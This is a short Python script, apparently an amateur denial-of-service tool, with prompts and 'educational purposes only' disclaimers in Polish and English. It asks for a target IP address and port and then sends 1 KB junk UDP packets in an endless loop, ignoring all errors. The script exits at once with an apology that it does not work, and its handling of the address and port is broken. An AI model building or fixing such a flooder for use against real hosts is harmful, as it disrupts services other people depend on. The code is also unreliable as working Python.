import socket
import time
print("im sorry this code wont work because i messed something up i will fix it soon")
exit()
print("--- [DISCLAIMER] Narzędzie wyłącznie do celów edukacyjnych i testów we własnym środowisku. Autor nie ponosi odpowiedzialności za szkody!!! ---")
print("--- [DISCLAIMER] Educational purposes only. Use at your own risk. The author is not responsible for any misuse or damage!!! ---")
target_ip = int(input("podaj ip "))
target_port = input("który port atakujemy??(jak niewiesz co to to daj np 80)")
fake_data = b"X" * 1024

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(fake_data, (target_ip, target_port))
        time.sleep(0.01)
    except:
        pass
